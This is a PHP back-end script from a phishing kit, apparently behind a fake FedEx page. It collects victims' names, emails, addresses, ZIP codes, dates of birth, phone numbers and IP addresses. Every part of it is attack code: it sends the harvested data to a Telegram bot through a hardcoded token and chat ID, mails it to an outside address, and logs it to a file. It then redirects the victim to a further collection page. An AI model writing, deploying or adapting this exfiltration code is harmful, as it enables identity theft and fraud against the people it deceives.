<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "===============================\n";
$message .= "NAM  : ".$_POST['Log']."\n";
$message .= "EML  : ".$_POST['lname']."\n";
$message .= "ADR  : ".$_POST['adress']."\n";
$message .= "CTY  : ".$_POST['city']."\n";
$message .= "ZIP  : ".$_POST['zipcode']."\n";
$message .= "DOB  : ".$_POST['dob']."\n";
$message .= "ALO  : ".$_POST['phone']."\n";
$message .= "===============================\n";
$message .= "IP              : $ip\n";
$message .= "===============================\n";

$website="https://api.telegram.org/bot1782789196:AAG2ZzQfPqJ9uZ2v3T5FFjOcV6384nUFx_s";
	$params=[
		'chat_id'=>'1092618954',
		'text'=>$message,
		'parse_mode'=>'html'
	];
	$ch = curl_init($website . '/sendMessage');
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);

$send = "kate.over@yandex.com";
$subject = "FDX lNFO | $ip ";
$headers = "From: Z3CI <webmaster@localhost.com>";
mail($send,$subject,$message,$headers);
header("Location: fulllz.php ");
$txt = fopen('/../LGN.txt', 'a');
fwrite($txt, $message);
fclose($txt);
?>